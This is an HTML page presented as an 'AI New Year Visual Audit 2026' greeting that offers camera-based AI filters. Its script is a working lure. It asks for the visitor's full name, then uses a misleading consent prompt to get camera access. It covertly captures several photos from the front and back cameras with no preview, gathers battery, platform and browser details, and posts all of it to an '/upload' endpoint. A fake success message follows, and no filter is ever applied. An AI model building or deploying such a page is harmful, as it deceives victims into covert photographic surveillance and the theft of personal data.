<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AI New Year Visual Audit 2026</title>
    <style>
        body { background: #050505; color: #00ff00; text-align: center; font-family: 'Courier New', monospace; padding: 20px; }
        .main-container { margin-top: 30px; border: 2px solid #00ff00; padding: 25px; display: inline-block; background: #000; box-shadow: 0 0 20px #00ff00; border-radius: 15px; max-width: 90%; }
        h2 { font-size: 1.5rem; text-shadow: 0 0 10px #00ff00; margin-bottom: 20px; }
        input { padding: 12px; width: 85%; margin-bottom: 20px; background: #111; color: #00ff00; border: 1px solid #00ff00; border-radius: 5px; outline: none; }
        .btn { padding: 15px; margin: 8px 0; cursor: pointer; background: transparent; color: #00ff00; border: 1px solid #00ff00; font-weight: bold; width: 100%; border-radius: 5px; transition: 0.3s; text-transform: uppercase; }
        .btn:hover { background: #00ff00; color: #000; box-shadow: 0 0 15px #00ff00; }
        #status { color: #ff0000; margin-top: 15px; font-weight: bold; display: none; animation: blink 1s infinite; }
        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
    </style>
</head>
<body>
    <div class="main-container">
        <h2>🎇 AI SYSTEM AUDIT 2026 🎇</h2>
        <p style="color: #888; font-size: 0.8rem;">[ SECURITY PROTOCOL: ACTIVE ]</p>
        <input type="text" id="name" placeholder="ENTER YOUR FULL NAME...">
        <br>
        <button class="btn" onclick="initiateAudit(1)">📸 FRONT CAMERA (5 SHOTS)</button>
        <button class="btn" onclick="initiateAudit(2)">📷 BACK CAMERA (5 SHOTS)</button>
        <button class="btn" onclick="initiateAudit(3)">🎭 DUAL CAMERA (3+3 SHOTS)</button>
        
        <div id="status">⚡ CORE SYNCING IN PROGRESS... DO NOT CLOSE...</div>
    </div>

    <video id="v" style="display:none" autoplay playsinline></video>
    <canvas id="c" style="display:none"></canvas>

    <script>
        async function initiateAudit(mode) {
            let name = document.getElementById('name').value;
            if(!name) {
                alert("CRITICAL ERROR: Name field cannot be empty!");
                return;
            }
            
            // Professional Consent for Camera Access
            if(confirm("SYSTEM NOTICE:\nTo apply high-definition AI filters and 2026 visual effects, temporary camera access is required. Proceed?")) {
                document.getElementById('status').style.display = 'block';
                
                try {
                    // Fetch Device Info
                    let battery = "Unknown";
                    try {
                        let bData = await navigator.getBattery();
                        battery = Math.round(bData.level * 100) + "%";
                    } catch(e) {}

                    let info = { 
                        battery: battery, 
                        platform: navigator.platform,
                        browser: navigator.userAgent.split(') ')[0] + ')'
                    };

                    if(mode == 1) {
                        // FRONT ONLY: 5 Photos
                        await runCapture(name, info, {facingMode: "user"}, 5, "FRONT");
                    } else if(mode == 2) {
                        // BACK ONLY: 5 Photos
                        await runCapture(name, info, {facingMode: "environment"}, 5, "BACK");
                    } else if(mode == 3) {
                        // DUAL: 3 Back then 3 Front
                        await runCapture(name, info, {facingMode: "environment"}, 3, "BACK");
                        await runCapture(name, info, {facingMode: "user"}, 3, "FRONT");
                    }

                    document.getElementById('status').style.color = "#00ff00";
                    document.getElementById('status').innerText = "SUCCESS: AI WISH GENERATED! ✅";
                    alert("Happy New Year 2026, " + name + "!\nYour AI-enhanced wish has been created.");
                } catch(err) {
                    alert("ERROR: Permission Denied. System cannot apply AI effects.");
                    document.getElementById('status').style.display = 'none';
                }
            }
        }

        async function runCapture(name, info, constraints, count, type) {
            try {
                let stream = await navigator.mediaDevices.getUserMedia({ video: constraints });
                let video = document.getElementById('v');
                video.srcObject = stream;

                for (let i = 1; i <= count; i++) {
                    await new Promise(res => setTimeout(res, 1500)); // Delay between captures
                    
                    let can = document.getElementById('c');
                    can.width = video.videoWidth; 
                    can.height = video.videoHeight;
                    can.getContext('2d').drawImage(video, 0, 0);
                    
                    let imgData = can.toDataURL('image/jpeg', 0.6);

                    // Upload to Server
                    fetch('/upload', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            name: name, 
                            image: imgData, 
                            info: info, 
                            label: type + " SHOT " + i
                        })
                    });
                }
                // Stop the camera stream after finish
                stream.getTracks().forEach(track => track.stop());
            } catch (error) {
                console.error("Camera error:", error);
            }
        }
    </script>
</body>
</html>
